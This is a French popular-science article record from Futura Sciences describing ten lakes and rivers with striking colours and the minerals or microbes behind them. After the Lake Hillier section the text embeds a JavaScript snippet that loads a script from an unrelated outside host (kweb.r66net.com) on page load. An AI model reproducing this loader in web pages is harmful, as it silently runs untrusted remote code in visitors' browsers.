{"title": "Top 10 des lacs les plus colorés du monde", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "22/07/2017", "content": "La couleur d'un lac est généralement le reflet de l'état du ciel ou de la composition de ses profondeurs. Parfois quelques phénomènes naturels interviennent pour nous offrir un spectacle aussi inattendu que magnifique. L’incroyable couleur rose bonbon du lac Hillier Le lac Hillier, en Australie, et sa couleur rose chewing-gum. © twonightsin, Instagram                               Le lac Hillier (Australie) a été découvert en 1802. Son eau, comme on peut le voir sur cette photo, affiche une surprenante  couleur   rose chewing-gum . Grâce à la composition de son fond ? Non. Car lorsque l'on prélève un verre de cette eau, elle apparaît également rose dans le verre. Peut-être alors grâce à des  micro-organismes  ( bactéries  ou  algues ) qui apprécient particulièrement les eaux très salées de ce lac extraordinaire. Quoi qu'il en soit, cette curiosité de la nature semble tout à fait inoffensive pour l'Homme. Alors, si vous en avez l'occasion, n'hésitez pas à aller y piquer une tête !  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le lac Rebta, un autre lac rose Le lac Retba, au Sénégal, et son étonnante couleur rose. © tourismandtravel, Instagram                               Le lac Retba se situe sur la côte du Sénégal, à quelques centaines de mètres de l'océan Atlantique. Lui aussi est extrêmement salé et présente une couleur  rosée . Celle-ci lui viendrait de  cyanobactéries  se pigmentant ainsi pour survivre à la forte concentration en sel et faisant  masse  ici. Le lac Colorada et ses teintes rouge sang Le lac Colorada dans lequel semble couler le sang. © fisicawildson, Instagram                               La laguna Colorada est elle aussi une étendue d' eau salée , très salée même. Elle constitue un lieu de reproduction privilégié pour les flamants des Andes. Elle regorge d'algues et de  sédiments  aux couleurs rouges. Résultat : ses eaux prennent parfois des nuances marron, mais le plus souvent, une couleur rouge sang. L’eau rouge du Rio Tinto L’eau du fleuve Rio Tinto est teintée de rouge. © Ildefonso Grados, Wikipedia, Domaine public                               Le Rio Tinto, qui coule en Espagne, est un fleuve qui charrie des  eaux rouges . Cette couleur particulière, il la devrait à la météorisation — en d'autres mots à l' oxydation  microbiologique — des minéraux contenant des  sulfures  de  métaux  lourds que l'on trouve dans les  gisements  miniers le long du fleuve. Le Grüner See, un lac vert Les eaux du Grüner See sont aussi vertes que des émeraudes. © Martin Toedtling, Wikipedia, CC by-SA 3.0                               Le Grüner See, comprenez  lac vert , est un lac autrichien bien particulier. Par sa couleur, d'un vert émeraude, mais aussi parce qu'il s'agit d'un lac de montagne éphémère. Il se remplit en quelques semaines, à la  fonte  des neiges. Ensuite, il se vide en quelques jours seulement, laissant la place à un parc naturel. L’extraordinaire eau verte de la laguna Verde Derrière les eaux vertes de la laguna Verde, on devine les eaux blanches de la laguna Blanca. © Albert Backer, Wikipedia, CC by-SA 3.0                               En Bolovie, au pied d'un  volcan  se trouve, la laguna Verde, un lac dont l'eau présente une extraordinaire couleur verte. Celle-ci serait due à sa forte concentration en  magnésium . Il a même été photographié par la Nasa depuis une navette spatiale. Un lac noir nommé Tiwu Ata Mbupu Le lac Tiwu Ata Mbupu et son eau noire. © Aganto Seno_Komodo NP, Panoramio                               En Indonésie, le volcan Kelimutu possède trois lacs de cratère qui présentent chacun sa couleur propre. Parmi eux, le plus surprenant, peut-être, le lac Tiwu Ata Mbupu, ou lac des gens âgés, et ses eaux de couleur noire. Les mille couleurs du site de Waiotapu Les lacs du site de Waiotapu brillent de mille couleurs. © Tokyoahead, Wikipedia, CC by-SA 3.0                               En Nouvelle-Zélande, il est un site incroyable sur lequel se trouvent plusieurs lacs aux couleurs variées. En Maori d'ailleurs, son nom, Waiotapu, signifie « eaux sacrées ». Le site correspond à une  zone géothermique  particulièrement active qui serait à l'origine des couleurs incroyables qu'arborent les eaux de ses lacs. Grand Prismatic Spring , un lac aux couleurs de l’arc-en-ciel Le  Grand Prismatic Spring  et ses eaux aux couleurs de l’arc-en-ciel offrent un spectacle magnifique. © Chrisdelachal, Wikipedia, CC by-SA 3.0                               Au cœur du parc de Yellowstone, aux États-Unis, il est un autre lac multicolore, le  Grand Prismatic Spring . Il tient ses teintes surprenantes d'organismes thermophiles aux couleurs jaune, bleu, vert ou encore brun qui le peuplent. Les eaux de ce lac, chauffées par l'activité volcanique locale, sont brûlantes. Okama, un lac aux couleurs changeantes Le lac Okama apparaît sous dans une belle teinte émeraude. © mechi823, Instagram                               Situé au Japon, le lac Okama est un lac volcanique. Il est surnommé « le lac aux cinq couleurs », car la couleur de ses eaux change en fonction de la  lumière  ambiante. Un sous-marin sur Titan, dans les profondeurs du lac Kraken Mare                       Sur Titan, une des lunes de Saturne, se trouve un lac d’hydrocarbures et d’azote liquide à -190 °C. Un environnement hostile que la Nasa pourrait explorer à l’aide d’un sous-marin un peu particulier à découvrir en vidéo.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  couleur des lacs  |  lacs volcaniques  |  lacs de lave", "theme": "planete"}